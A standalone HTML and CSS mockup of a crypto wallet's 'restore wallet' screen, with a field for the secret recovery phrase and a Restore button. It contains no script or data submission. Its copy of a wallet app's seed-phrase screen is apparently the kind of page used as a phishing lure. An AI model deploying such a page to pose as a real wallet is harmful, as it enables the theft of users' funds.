<!DOCTYPE html>
<html>
<head>
    <title>Multi-coin wallet</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: white;
            max-width: 600px;
            margin: 0 auto;
        }

        .header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 30px;
            padding: 0 10px;
        }

        .back-arrow {
            color: #666;
            font-size: 24px;
            text-decoration: none;
            min-width: 24px;
        }

        .title {
            font-size: 24px;
            font-weight: 500;
            flex-grow: 1;
            text-align: center;
            margin: 0 15px;
        }

        .expand-icon {
            color: #666;
            font-size: 20px;
            min-width: 24px;
        }

        .form-group {
            margin-bottom: 30px;
            padding: 0 10px;
        }

        .label {
            color: #666;
            font-size: 16px;
            margin-bottom: 10px;
        }

        .input-container {
            position: relative;
            margin-bottom: 10px;
        }

        .text-input {
            width: 100%;
            padding: 15px;
            border: 1px solid #ddd;
            border-radius: 10px;
            font-size: 16px;
            box-sizing: border-box;
        }

        .clear-button {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            background: #ddd;
            border: none;
            color: white;
            width: 20px;
            height: 20px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            -webkit-tap-highlight-color: transparent;
        }

        .textarea {
            width: 100%;
            height: 150px;
            padding: 15px;
            border: 1px solid #ddd;
            border-radius: 10px;
            font-size: 16px;
            box-sizing: border-box;
            resize: none;
        }

        .paste-button {
            position: absolute;
            right: 15px;
            bottom: 15px;
            background: none;
            border: none;
            color: blue;
            font-size: 16px;
            cursor: pointer;
            padding: 5px 10px;
            -webkit-tap-highlight-color: transparent;
        }

        .helper-text {
            text-align: center;
            color: #666;
            font-size: 14px;
            margin-top: 10px;
            padding: 0 20px;
        }

        .restore-button {
            width: calc(100% - 20px);
            padding: 15px;
            background-color: #f5f5f5;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            color: #666;
            cursor: pointer;
            margin: 30px 10px 0;
            -webkit-tap-highlight-color: transparent;
        }

        .help-link {
            display: block;
            text-align: center;
            color: blue;
            text-decoration: none;
            margin-top: 20px;
            font-size: 16px;
            padding: 10px;
        }

        @media (max-width: 480px) {
            body {
                padding: 15px;
            }

            .header {
                padding: 0 5px;
            }

            .title {
                font-size: 20px;
                margin: 0 10px;
            }

            .form-group {
                padding: 0 5px;
            }

            .text-input,
            .textarea {
                padding: 12px;
                font-size: 15px;
            }

            .label {
                font-size: 15px;
            }

            .helper-text {
                font-size: 13px;
                padding: 0 15px;
            }

            .restore-button {
                margin: 20px 5px 0;
                padding: 12px;
            }

            .help-link {
                font-size: 15px;
            }
        }

        /* Prevent zoom on input focus for iOS */
        @media screen and (-webkit-min-device-pixel-ratio: 0) { 
            select,
            textarea,
            input {
                font-size: 16px;
            }
        }
    </style>
</head>
<body>
    <div class="header">
        <a href="#" class="back-arrow">←</a>
        <h1 class="title">Multi-coin wallet</h1>
        <span class="expand-icon">⤢</span>
    </div>

    <div class="form-group">
        <div class="label">Wallet name</div>
        <div class="input-container">
            <input type="text" class="text-input" value="Main Wallet">
            <button class="clear-button">×</button>
        </div>
    </div>

    <div class="form-group">
        <div class="label">Secret phrase</div>
        <div class="input-container">
            <textarea class="textarea"></textarea>
            <button class="paste-button">Paste</button>
        </div>
        <div class="helper-text">
            Typically 12 (sometimes 18, 24) words separated by single spaces
        </div>
    </div>

    <button class="restore-button">Restore wallet</button>

    <a href="#" class="help-link">What is a secret phrase?</a>
</body>
</html>
